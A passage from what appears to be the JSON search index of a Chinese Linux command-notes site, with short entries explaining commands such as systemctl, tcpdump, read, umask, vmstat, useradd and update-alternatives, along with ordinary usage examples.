目标位置存在且为目录时, cp/mv到这个目录下; 当目标文件存在时候, 会直接覆盖掉, 使用 -n 不覆盖.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-product.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-product.html"},{"title":"pwck","text":"检查账号文件 /etc/passwd 配置信息是否正确 会与 /etc/shadow 比对","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-pwck.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-pwck.html"},{"title":"reboot","text":"通知系统重启: # reboot           ### 重启机器\n# reboot --halt    ### 停止机器\n# reboot -p        ### 关闭机器","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-reBoot.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-reBoot.html"},{"title":"read","text":"功能 从键盘读取输入 使用: read [-options] [ variables ] 选项 选项参数 选项 含义 -p 输入提示信息 -r 不转义读取 -n num 仅读取 num 个字符串, 而非整行 -a array 把读取的数据赋值给数组 array，从下标 0 开始。 -d delimiter 用字符串 delimiter 指定读取结束的位置，而不是一个换行符（读取到的数据不包括 delimiter）。 -e 在获取用户输入的时候，对功能键进行编码转换，不会直接显式功能键对应的字符。 -p prompt 显示提示信息，提示内容为 prompt 。 -s 静默模式（ Silent mode ），不会在屏幕上显示输入的字符。当输入密码和其它确认信息的时候，这是很有必要的。 -t seconds 设置超时时间，单位为秒。如果用户没有在指定时间内输入完成，那么 read 将会返回一个非 0 的退出状态，表示读取失败。 -u fd 使用文件描述符 fd 作为输入源，而不是标准输入，类似于重定向。 示例 #!/bin/bash tip = 'n' while [ \" ${ tip } \" ! = 'y' ] ; do read -p \"添加成功后输入 y 确认 >\" -r tip done","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-read.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-read.html"},{"title":"rename","text":"在Debian或者Ubuntu环境下使用的语法是: rename 's/stringx/stringy/' files 而在CentOS下或者RedHat下是: rename stringx stringy files rename的参数分为三部分: #stringx ： 被替换字符串\n#stringy ：替换字符串\n#files ：匹配的文件列表 比如批量将所有文件名中包含的 (1) 删除掉 rename 's/\\(1\\)//' *","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-rename.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-rename.html"},{"title":"runlevel","text":"查看当前系统运行的级别. 即, init 的支持的值","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-runlevel.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-runlevel.html"},{"title":"service","text":"service 命令与传统的 SysVinit 和 Upstart 初始化系统相关。\n较早期的 Linux 发行版（如早期的 Ubuntu、Red Hat 等）使用了这些初始化系统。\n虽然许多现代 Linux 发行版已经转向使用 systemd，但它们通常仍然提供 service 命令作为向后兼容支持。 service命令可以启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。 service命令的作用是去/etc/init.d目录下寻找相应的服务，进行开启和关闭等操作 要查看 service 命令是否被映射到 systemctl，可以通过检查 service 命令的实际文件类型和链接来实现: ls -l $(which service) 如果 service 命令被映射到 systemctl，输出结果可能类似于: lrwxrwxrwx 1 root root 21 Oct 13 10:10 /usr/sbin/service -> /usr/bin/systemctl 示例 开启关闭一个httpd服务: service httpd start/stop 查看系统服务的状态: service --status-all","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-service.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-service.html"},{"title":"setfattr","text":"设置文件系统对象的扩展属性 安装: apt install attr 选项: -n name , --name= name 指定拓展属性名称 -v value , --value= value 指定拓展属性的值, 与-n对应 -x name , --remove= name 移除指定的拓展属性 -h , --no-dereference Do not follow symlinks. If pathname is a symbolic link, it is not followed, but is instead itself the inode being modified. --restore= file Restores extended attributes from file. The file must be in the format generated by the getfattr command with the --dump option. If a dash ( -) is given as the file name, setfattr reads from standard input. --version Print the version of setfattr and exit. --help Print help explaining the command line options. -- End of command line options. All remaining parameters are interpreted as file names, even if they start with a dash character.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-setfattr.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-setfattr.html"},{"title":"shutdown","text":"shutdown 会给系统计划一个时间关机。它可以被用于停止、关机、重启机器。shutdown 会给系统计划一个时间关机。\n它可以被用于停止、关机、重启机器。 关闭机器: shutdown -p now 停止机器: shutdown -H now 在 09:35am 重启机器: shutdown -r 09:35 要取消即将进行的关机，只要输入下面的命令: shutdown -c","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-shutdown.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-shutdown.html"},{"title":"strings","text":"一般会内置, 但是像docker那种需要手动安装: apt install binutils 打印文件中可打印的字符, 可以是 文本文件（test.c） 可执行文件(test) 目标文件(test.o, 链接后可生成动态库) 动态链接库(test.so) 静态链接库(test.a) strings 命令在对象文件或二进制文件中查找可打印的字符串。\n字符串是 4 个或更多可打印字符的任意序列，以换行符或空字符结束。\nstrings 命令对识别随机对象文件很有用。 语法: strings [ -a ] [ - ] [ -o ] [ -t Format ] [ -n Number ] [ -Number ] [ File ... ] 选项 -a 或 - , 搜索整个文件，而不仅仅是数据段，以寻找可打印的字符串。\n如果省略这个标志，则 strings 命令只在对象文件的初始化数据空间内寻找。 -n Number 指定最小的字符串长度（除了缺省的 4 个字符以外）。\n字符串长度的最大值是 4096。这个标志与 -Number 标志相同。 -o 列出文件中每个跟随在其八进制偏移量之后的字符串。这个标志与 -t o 标志相同。 -t Format 列出从文件最开始起，每个跟随在其偏移量之后的字符串。该格式取决于用作 Format 变量的字符。 d 以十进制写下偏移量。 o 以八进制写下偏移量。 x 以十六进制写下偏移量。 注解 当 -o 和 -t Format 标志在一个命令行上多次定义，则最后指定的标志控制 strings 命令的行为。 -N umber 指定最小的字符串长度（除了缺省的 4 个字符以外）。字符串长度的最大值是 4096。这个标志与 -n Number 标志相同。 File 要搜索的二进制文件或对象文件。 注解 strings若看到同一个库的不同版本的依赖, 如: ZLIB_1.2.3.4\nZLIB_1.2.9 有以下几种可能: 此共享库同时依赖了两个不同的版本 维护不佳, 升级新版本时没有移除旧版本 误报","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-strings.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-strings.html"},{"title":"sync","text":"强制将内存中的文件缓冲内容写到磁盘。 Linux sync命令用于数据同步,sync命令是在关闭Linux系统时使用的。\nLinux 系统中欲写入硬盘的资料有的时候为了效率起见，会写到 filesystem buffer 中，\n这个 buffer 是一块记忆体空间，如果欲写入硬盘的资料存于此 buffer 中，\n而系统又突然断电的话，那么资料就会流失了，sync 指令会将存于 buffer 中的资料强制写入硬盘中。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-sync.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-sync.html"},{"title":"systemctl","text":"一个systemd工具，主要负责控制systemd系统和服务管理器.\nsystemd 是许多现代 Linux 发行版（如 Ubuntu、Fedora、Debian 等）的默认初始化系统。\nsystemd 采用了并行启动方式，提供了更快的启动速度和更高的灵活性。 systemctl 是 systemd 的主要命令行工具，用于控制和管理系统服务、挂载点、设备等.\n它融合之前 service 和 chkconfig 的功能于一体。可以使用它永久性或只在当前会话中启用/禁用服务。 Systemd(system daemon)是一个系统管理守护进程、工具和库的集合，用于取代System V初始进程。\nSystemd的功能是用于集中管理和配置类UNIX系统。 常见用法 列出所有可用单元: systemctl list-unit-files\nsystemctl list-units 列出所有失败单元: systemctl --failed 检查某个单元是否启动: systemctl is-enabled httpd.service 检查某个服务的运行状态: systemctl status httpd.service 列出所有服务: systemctl list-unit-files --type=service 查询服务是否激活: systemctl is-active httpd 服务查看是否配置开机自启动: systemctl is-enabled <service-name> 服务配置开机自启动(禁用+启用): systemctl disable httpd\nsystemctl enable httpd 使用systemctl命令杀死服务: systemctl kill httpd 列出系统的各项服务，挂载，设备等: systemctl list-unit-files --type 获得系统默认启动级别和设置默认启动级别: systemctl get-default\nsystemctl set-default multi-user.target 启动运行等级: systemctl isolate multiuser.target 重启、停止，挂起、休眠系统等: systemctl reboot\nsystemctl halt\nsystemctl suspend\nsystemctl hibernate\nsystemctl hybrid-sleep","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-systemctl.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-systemctl.html"},{"title":"tcpdump","text":"一款sniffer工具，是Linux上的抓包工具，嗅探器\n文字接口的封包抓取 一个功能强大的命令行数据包分析器，它是通过监听服务器的网卡来获取数据包，\n所有通过网络访问的数据包都能获取到。\n它也提供了过滤器的功能，可以获取指定的网络、端口或协议的数据包 选项 -a 尝试将网络和广播地址转换成名称； -c <count> count表示数据包数目. 抓取数据包的数量达到count后结束命令，如果不使用-c 参数，会不停的抓取数据包，直到手动停止 -C <file_size> 抓取数据包保存到文件时，通过该命令指定文件的大小。\n文件达到指定大小后，会创建一个在原文件名称后面加上序号的新文件，如：dump.txt，dump.txt1。\nfile_size的单位是b -d 把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出； -d d 把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出； -d dd 把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出； -D 列出服务器所有网卡。\ntcpdump默认监听的是编号最小的那个网卡，一般是eth0。\n在进行抓包时可以通过 -i 参数指定监听的网卡，any表示监听所有网卡 -e 在每列倾倒资料上显示连接层级的文件头； -f 用数字显示网际网络地址； -F <表达文件> 指定内含表达方式的文件； -i <interface> 指定监听的网卡名称，any表示监听所有的网卡; 如eth0； -l 使用标准输出列的缓冲区； -n 输出结果中，不把ip转换成主机名（默认显示的是主机名） -N 不列出域名； -O 不将数据包编码最佳化； -p 不让网络界面进入混杂模式； -q 快速输出，仅列出少数的传输协议信息(简要的数据包信息) -r <file> 从指定的文件读取数据包数据, 不再从网络获取数据包 -w <file> 将抓取的数据包保存到文件，-r 参数可以从文件中读取数据包 -W <filecount> 指定文件的数量，当文件滚动到指定数量后会从第一个文件开始覆盖 -s <数据包大小> 设置每个数据包的大小； -S 用绝对而非相对数值列出TCP关联数； -t 不输出时间戳 -t t 在每列倾倒资料上显示未经格式化的时间戳记； -T <数据包类型> 强制将表达方式所指定的数据包转译成设置的数据包类型； -v 详细显示指令执行过程； -v v 更详细显示指令执行过程； -x 用十六进制字码列出数据包资料； -w <数据包文件> 把数据包数据写入指定的文件。 除了以上参数，还有一些关键字可以用来进行条件过滤，常用关键字如下: host 过滤主机，如 tcpdump host 192.168.1.110 只抓取经过这个ip的数据包 src 用来过滤请求来源方的参数，如：tcpdump src host 192.168.1.110, 只抓取从这个ip过来的数据包 dst 用来过滤请求接收方的参数，如：tcpdump dst host 192.168.1.110, 只抓取发送到这个ip的数据包 port 过滤端口，如：tcpdump port 8080, 只抓取经过8080端口的数据包 net 过滤网络，如：tcpdump net 192.168, 只抓取经过这个网段的数据包 and, not, or 条件过滤，和字面意思一样。如：tcpdump net 192.168 and port 8080 抓取经过192.168网段并经过8080端口的数据包 数据包分析 抓取的数据包格式如下: $ sudo tcpdump -i any port 443\ntcpdump: data link type PKTAP\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type PKTAP (Apple DLT_PKTAP), snapshot length 524288 bytes\n\n18:23:05.458511 IP6 240e:399:299:b5e0:91fd:8c93:e300:58e0.63539 > 240e:d9:a600:834::15.https: Flags [.], ack 2868012794, win 4096, length 0\n18:23:05.463866 IP6 240e:d9:a600:834::15.https > 240e:399:299:b5e0:91fd:8c93:e300:58e0.63539: Flags [.], ack 1, win 285, length 0\n18:23:07.904922 IP 49.7.149.118.https > 192.168.101.4.61893: Flags [P.], seq 3360794318:3360794350, ack 4281540851, win 65, length 32\n18:23:07.905058 IP 192.168.101.4.61893 > 49.7.149.118.https: Flags [.], ack 32, win 4096, length 0 详细数据对应为: 18:23:07.905058 IP 192.168.101.4.61893 > 49.7.149.118.https: Flags [.], ack 32, win 4096, length 0\n\n时间戳          IP请求发送方的ip和端口 > 请求接收方的ip和端口         ack-包类型        length-报文体的长度\n                                                          Flags-标识和状态   win-表示当前窗口的可用大小 时间戳 时:分:秒.微秒 IP 网际网络协议的名称 请求发送方的ip和端口 > 请求接收方的ip和端口 端口有时会显示为某个网络协议，如http、ssh、mysql等* Flags [R] flag标识和状态，可选的状态有: [S.] [.] [P.] [F.][R] seq、ack、fin 表示tcp协议的3次握手和4次挥手的过程。\nseq表示请求的序列号，ack是回答的序列号，fin表示完成。\n这里显示的序列号是相对值，-S参数可以显示绝对值 win 表示当前窗口的可用大小 length 报文体的长度，从长度可以简单分析是否正确接收了请求 通过以上结果只能做简单的分析，可以使用 -w 参数把数据包写入文件，\n文件中记录的数据包比命令行要详细的多。\n借助分析工具可以对文件进一步分析，\n这里推荐使用Wireshark，这个工具是开源的，开箱即用使用简单，这里不做详细介绍了 常用的命令组合 抓取8080端口的数据包: tcpdump -i any port 8080 抓取从192.168.1.110发送到192.168.1.111的数据包: tcpdump -i any src host 192.168.1.110 and dst host 192.168.1.111 抓取192.168网段除了192.168.1.110的请求的数据包: tcpdump -i any src net 192.168 and 'src host not 192.168.1.110' 抓取8080端口的数据包并写入dump.log文件中: tcpdump -i any port 8080 -w dump.log 注意事项 tcpdump需要用管理员权限运行，可以用sudo命令或者root用户 抓取的数据包通过length字段只能做一些简单的判断，想要详细分析，需要借助数据包分析工具，如：Wireshark","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-tcpdump.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-tcpdump.html"},{"title":"test","text":"判断 跟shell的if语句差不多: -nt    newer than    判断 file1 是否比 file2 新\n-ot    older than    判断 file1 是否比 file2 旧\n-ef    判断 file1 和 file2 是否为同一文件，可用在判断 hard link 的判定。即，判定两个文件是否指向同一个 inode 如: test file -nt file2","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-test.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-test.html"},{"title":"time","text":"统计给定命令所花费的总时间 语法: time(参数) 参数 指令：指定需要运行的额指令及其参数。 实例 当测试一个程序或比较不同算法时，执行时间是非常重要的，\n一个好的算法用时一定是较优的。\n所有类UNIX系统都包含time命令，使用这个命令可以统计时间消耗。例如: [root@localhost ~]# time ls\nanaconda-ks.cfg  install.log  install.log.syslog  satools  text\n\nreal    0m0.009s\nuser    0m0.002s\nsys     0m0.007s 输出的信息分别显示了该命令所花费的real时间、user时间和sys时间。 real时间 指挂钟时间，也就是命令开始执行到结束的时间。这个短时间包括其他进程所占用的时间片，和进程被阻塞时所花费的时间。 user时间 指进程花费在用户模式中的CPU时间，这是唯一真正用于执行进程所花费的时间，其他进程和花费阻塞状态中的时间没有计算在内。 sys时间 指花费在内核模式中的CPU时间，代表在内核中执系统调用所花费的时间，这也是真正由进程使用的CPU时间。 shell内建也有一个time命令，当运行time时候是调用的系统内建命令，\n因为系统内建的功能有限，所以需要时间其他功能需要使用time命令可执行二进制文件 /usr/bin/time 使用 -o 选项将执行时间写入到文件中: /usr/bin/time -o outfile.txt ls 使用 -a 选项追加信息: /usr/bin/time -a -o outfile.txt ls 使用 -f 选项格式化时间输出: /usr/bin/time -f \"time: %U\" ls -f 选项后的参数 参数 描述 %E real时间，显示格式为[小时:]分钟:秒 %U user时间。 %S sys时间。 %C 进行计时的命令名称和命令行参数。 %D 进程非共享数据区域，以KB为单位。 %x 命令退出状态。 %k 进程接收到的信号数量。 %w 进程被交换出主存的次数。 %Z 系统的页面大小，这是一个系统常量，不用系统中常量值也不同。 %P 进程所获取的CPU时间百分百，这个值等于 user+system 时间除以总共的运行时间。 %K 进程的平均总内存使用量（data+stack+text），单位是 KB 。 %w 进程主动进行上下文切换的次数，例如等待I/O操作完成。 %c 进程被迫进行上下文切换的次数（由于时间片到期）。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-time.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-time.html"},{"title":"touch","text":"创建空文件 指定时间的文件创建: touch -t '202110211245.23' te.txt","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-touch.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-touch.html"},{"title":"ttygif","text":"终端录屏工具 github地址: https://github.com/icholy/ttygif debian安装: apt install ttygif mac安装: brew install ttygif 用法: ttygif [option] <in_file> [out.gif] in_file: 从哪个 text/x-script 文件读取输入 out.gif: 输出文件名, 默认为 tty.gif 选项(不同系统的貌似有点不一样): -f, --fullscreen : include window border\n-s, --speed : Set speed [1.0]\n-h, --help : print this help\n-v, --version : print version 终端录制 开始录制: ttyrec <file_name> 若不给 file_name , 则默认生成的文件是 ttyrecord , 也可以使用 script 或者 asciinema , 都支持生成 text/x-script 文件 退出录制(或者直接 Ctrl + D ): exit 将 text/x-script 文件转换为gif: ttygif <file_name> 附一个完整的流程 code: ttyrec out.cast\n\necho this is a test\n\nexit\n# 这个时候就退出录制了 会在当前目录下生成out.cast\n\n# 转换为gif文件, 默认会在当前目录下生成tty.gif, 貌似不支持直接指定文件名\nttygif out.cast 注解 如果不是很需要, 建议使用小一点的终端, 不然全屏录制会比较占空间","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-ttygif.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-ttygif.html"},{"title":"umask","text":"参考:: Linux 命令大全 Linux umask命令指定在建立文件时预设的权限掩码。 umask可用来设定 [权限掩码]。\n[权限掩码]是由3个八进制的数字所组成，将现有的存取权限减掉权限掩码后，即可产生建立文件时预设的权限。 语法: umask [-S][权限掩码] 参数说明 -S 以文字的方式来表示权限掩码。 实例 使用指令\"umask\"查看当前权限掩码: $ umask                         #获取当前权限掩码 执行上面的指令后，输出信息如下: 0022 接下来，使用指令\"mkdir\"创建一个目录，\n并使用指令\"ls\"获取该目录的详细信息: $ mkdir test1                       #创建目录\n$ ls –d –l test1/                   #显示目录的详细信息 执行上面的命令后，将显示新创建目录的详细信息，如下所示: drwxr-xr-x 2 rootlocal rootlocal 4096 2011-9-19 21:46 test1/ 注意：在上面的输出信息中，\"drwxr-xr-x\"=\"777-022=755\"。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-umask.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-umask.html"},{"title":"umount","text":"相关指令: mount 卸载已经加载的文件系统。利用设备名或挂载点都能umount文件系统，\n不过最好还是通过挂载点卸载，以免使用绑定挂载（一个设备，多个挂载点）时产生混乱。 语法: umount(选项)(参数) 选项 -a 卸除/etc/mtab中记录的所有文件系统； -h 显示帮助； -n 卸除时不要将信息存入/etc/mtab文件中； -r 若无法成功卸除，则尝试以只读的方式重新挂入文件系统； -t <文件系统类型> 仅卸除选项中所指定的文件系统； -v 执行时显示详细的信息； -V 显示版本信息。 参数: 文件系统：指定要卸载的文件系统或者其对应的设备文件名。 延迟卸载（lazy unmount）会立即卸载目录树里的文件系统，\n等到设备不再繁忙时才清理所有相关资源. 卸载可移动存储介质还可以用 eject 命令.\n下面这条命令会卸载 [cd](http://man.linuxde.net/cd) 并弹出CD: eject /dev/cdrom      卸载并弹出CD","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-umount.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-umount.html"},{"title":"uniq","text":"忽略重复的行 -c , --count 在每行开头增加重复次数。 -d , --repeated 所有邻近的重复行只被打印一次。输出出现次数大于1的内容 -D 所有邻近的重复行将全部打印。 -u 输出出现次数为1的内容","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-uniq.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-uniq.html"},{"title":"unset","text":"与 set 相反 unset删除变量或者函数: -f      #仅删除函数\n-v      #仅删除变量","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-unset.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-unset.html"},{"title":"unzip","text":"unzip 命令可以查看和解压缩 zip 文件。\n与 zip 相反.\n该命令的基本格式如下: unzip [选项] 压缩包名 选项: -d 目录名        将压缩文件解压到指定目录下。\n-n          解压时并不覆盖已经存在的文件。\n-o          解压时覆盖已经存在的文件，并且无需用户确认。\n-v          查看压缩文件的详细信息，包括压缩文件中包含的文件大小、文件名以及压缩比等，但并不做解压操作。\n-t          测试压缩文件有无损坏，但并不解压。\n-x 文件列表\n          解压文件，但不包含文件列表中指定的文件。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-unzip.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-unzip.html"},{"title":"update-alternatives","text":"貌似只有GUI界面才有用 (DEBIAN系列专有) 用软链接的方式处理系统中软件版本的切换，使其多版本共存.\nalternatives 的管理目录 /etc/alternatives 管理方式 主要是三层路径 第一层路径, 软链接, 一般是系统的默认PATH下, 主要是: /usr/bin 下面或者 /usr/local/bin 下.\n链接的目标为第二层路径. 第二层路径, 软链接, 为alternatives的管理目录 /etc/alternatives 链接目标为第三层. 第三层路径, 执行文件的真实路径, 可以为任意路径,\n比如自己安装的Python /usr/local/mypython/bin/python 用法 用法: update-alternatives [<选项> ...] <命令> 命令: --install <链接> <名称> <路径> <优先级> [--slave <链接> <名称> <路径>] ...\n                          在系统中加入一组候选项。\n--remove <名称> <路径>   从 <名称> 替换组中去除 <路径> 项。\n--remove-all <名称>      从替换系统中删除 <名称> 替换组。\n--auto <名称>            将 <名称> 的主链接切换到自动模式。\n--display <名称>         显示关于 <名称> 替换组的信息。\n--query <名称>           机器可读版的 --display <名称>.\n--list <名称>            列出 <名称> 替换组中所有的可用候选项。\n--get-selections         列出主要候选项名称以及它们的状态。\n--set-selections         从标准输入中读入候选项的状态。\n--config <名称>          列出 <名称> 替换组中的可选项，并就使用其中哪一个，征询用户的意见。\n--set <名称> <路径>      将 <路径> 设置为 <名称> 的候选项。\n--all                    对所有可选项一一调用 --config 命令。\n\n<链接> 是指向 /etc/alternatives/<名称> 的符号链接。(如 /usr/bin/pager)\n<名称> 是该链接替换组的主控名。(就是/etc/alternatives/<名称>的<名称>, 如 pager)\n<路径> 是候选项目标文件的位置。(真实路径, 如 /usr/bin/less)\n<优先级> 是一个整数，在自动模式下，这个数字越高的选项，其优先级也就越高。\n.......... install的说明, 举例,\n将 /path/to/javac 设置为优先级为 100 的 javac 可替代项，\n并将 /usr/bin/java 关联到主项 /path/to/java sudo update-alternatives --install /usr/bin/javac javac /path/to/javac 100 --slave /usr/bin/java java /path/to/java 以便于将从属项与主项关联起来，并在切换主项时自动更新从属项的链接 实际应用 当安装了多个编辑器或者多个不同版本的软件如JAVA时,\n可以用来处理执行时使用哪个JAVA. 安装时候, 添加到管理: update-alternatives --install /usr/local/bin/java java /usr/local/myjava/bin/java 10 这个时候使用会自动按照优先级的顺序来选择,\n可以看看java已经注册了哪些: update-alternatives --display java 如果需要手动选择, 可使用config打开一个交互式界面让用户手动选择: update-alternatives --config java 重新修改为自动: update-alternatives --auto java 如果需要直接设置: update-alternatives --set java /usr/local/myjava/bin/java","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-update-alternatives.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-update-alternatives.html"},{"title":"update-desktop-database","text":"以GNOME桌面环境为例, 桌面环境的应用菜单并不是实时扫描所有的 .desktop 文件,而是维护一个桌面文件的数据库。\n当 .desktop 文件发生变化时,需要运行 update-desktop-database 来刷新这个数据库 如扫描 /usr/share/applications 目录下的 .desktop 文件,并更新桌面环境的应用菜单数据库: update-desktop-database /usr/share/applications","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-update-desktop-database.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-update-desktop-database.html"},{"title":"useradd","text":"功能 linux增加用户 选项 useradd选项 选项 -m 自动建立用户目录 -c<备注> 加上备注文字。备注文字会保存在passwd的备注栏位中； -d<登入目录> 指定用户登入时的启始目录； -D 变更预设值； -e<有效期限> 指定帐号的有效期限； -f<缓冲天数> 指定在密码过期后多少天即关闭该帐号； -g<群组> 指定用户所属的群组； -G<群组> 指定用户所属的附加群组； -m 自动建立用户的登入目录； -M 不要自动建立用户的登入目录； -n 取消建立以用户名称为名的群组； -r 建立系统帐号； -s<shell> 指定用户登入后所使用的shell； -u<uid> 指定用户id。 使用 通用, 建立用户 yanque , 自动建立用户目录, 登录shell /bin/bash , 指定用户登入目录为 /home/yanque , 不指定用户组, 会自动建立用户群组 yanque useradd yanque -m -s /bin/bash -d /home/yanque","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-useradd.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-useradd.html"},{"title":"vmstat","text":"vmstat是Virtual Meomory Statistics（虚拟内存统计）的缩写，\n可对操作系统的虚拟内存、进程、CPU活动进行监控。\n它是对系统的整体情况进行统计，\n不足之处是无法对某个进程进行深入分析。 vmstat工具提供了一种低开销的系统性能观察方式。\n因为vmstat本身就是低开销工具，\n在非常高负荷的服务器上，\n你需要查看并监控系统的健康情况，在控制窗口还是能够使用vmstat输出结果。 语法: vmstat [-a] [-n] [-S unit] [delay [ count]]\nvmstat [-s] [-n] [-S unit]\nvmstat [-m] [-n] [delay [ count]]\nvmstat [-d] [-n] [delay [ count]]\nvmstat [-p disk partition] [-n] [delay [ count]]\nvmstat [-f]\nvmstat [-V] 选项 -a 显示活跃和非活跃内存 -f 显示从系统启动至今的fork数量 。 -m 显示slabinfo -n 只在开始时显示一次各字段名称。 -s 显示内存相关统计信息及多种系统活动数量。 -d 显示磁盘相关统计信息 -p 显示指定磁盘分区统计信息 -S 使用指定单位显示。参数有 k 、K 、m 、M，\n分别代表1000、1024、1000000、1048576字节（byte）。默认单位为K（1024 bytes） -V 显示vmstat版本信息。 delay 刷新时间间隔。如果不指定，只显示一条结果。 count 刷新次数。如果不指定刷新次数，但指定了刷新时间间隔，这时刷新次数为无穷。 输出含义 如直接执行: # vmstat\nprocs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----\nr  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st\n2  0      0 6300920 268396 937448    0    0  1944   289  532  779  1  2 97  1  0 procs r 列表示运行和等待cpu时间片的进程数，如果长期大于1，说明cpu不足，需要增加cpu; b 列表示在等待资源的进程数，比如正在等待I/O、或者内存交换等 memory swpd 切换到内存交换区的内存数量(k表示),\n如果swpd的值不为0，或者比较大，比如超过了100m，只要si、so的值长期为0，系统性能还是正常 free 当前的空闲页面列表中内存数量(k表示) buff 作为buffer cache的内存数量，一般对块设备的读写才需要缓冲。 cache: 作为page cache的内存数量，一般作为文件系统的cache，\n如果cache较大，说明用到cache的文件较多，如果此时IO中bi比较小，说明文件系统效率比较好。 swap si 由磁盘进入内存交换区数量 so 由内存交换区进入磁盘数量 IO bi 从块设备读入数据的总量（读磁盘）（每秒kb） bo 块设备写入数据的总量（写磁盘）（每秒kb） 这里我们设置的bi+bo参考值为1000，如果超过1000，\n而且wa值较大应该考虑均衡磁盘负载，可以结合iostat输出来分析。 system 显示采集间隔内发生的中断数 in 列表示在某一时间间隔中观测到的每秒设备中断数 cs列表示每秒产生的上下文切换次数，如当 cs 比磁盘 I/O 和网络信息包速率高得多，都应进行进一步调查。 cpu 表示cpu的使用状态 us 列显示了用户方式下所花费 CPU 时间的百分比。\nus的值比较高时，说明用户进程消耗的cpu时间多，但是如果长期大于50%，需要考虑优化用户的程序。 sy 列显示了内核进程所花费的cpu时间的百分比。这里us + sy的参考值为80%，如果us+sy 大于 80%说明可能存在CPU不足。 id 列显示了cpu处在空闲状态的时间百分比 wa 列显示了IO等待所占用的CPU时间的百分比。\n如果wa超过30%，说明IO等待严重，\n这可能是磁盘大量随机访问造成的，也可能磁盘或者磁盘访问控制器的带宽瓶颈造成的(主要是块操作)。 参考: https://zhuanlan.zhihu.com/p/162711990","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-vmstat.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-vmstat.html"},{"title":"who","text":"查看当前所有登录系统的用户信息 支持的选项/参数: -m, am i      只显示执行who命令的用户名, 登陆终端和登录时间\n-q, --count   只显示用户的登录账号和登录用户数量\n-u            在登录时间后显示用户最后一次操作时间到当前时间的间隔\n--heading     显示列标题","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-who.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-who.html"},{"title":"zip","text":"压缩文件, zip 是个使用广泛的压缩程序，压缩后的文件后缀名为 .zip。 语法: zip [-AcdDfFghjJKlLmoqrSTuvVwXyz$][-b <工作目录>][-ll][-n <字尾字符串>][-t <日期时间>][-<压缩效率>][压缩文件][文件...][-i <范本样式>][-x <范本样式>] 参数: -A 调整可执行的自动解压缩文件。\n-b<工作目录> 指定暂时存放文件的目录。\n-c 替每个被压缩的文件加上注释。\n-d 从压缩文件内删除指定的文件。\n-D 压缩文件内不建立目录名称。\n-f 更新现有的文件。\n-F 尝试修复已损坏的压缩文件。\n-g 将文件压缩后附加在既有的压缩文件之后，而非另行建立新的压缩文件。\n-h 在线帮助。\n-i<范本样式> 只压缩符合条件的文件。\n-j 只保存文件名称及其内容，而不存放任何目录名称。\n-J 删除压缩文件前面不必要的数据。\n-k 使用MS-DOS兼容格式的文件名称。\n-l 压缩文件时，把LF字符置换成LF+CR字符。\n-ll 压缩文件时，把LF+CR字符置换成LF字符。\n-L 显示版权信息。\n-m 将文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中。\n-n<字尾字符串> 不压缩具有特定字尾字符串的文件。\n-o 以压缩文件内拥有最新更改时间的文件为准，将压缩文件的更改时间设成和该文件相同。\n-q 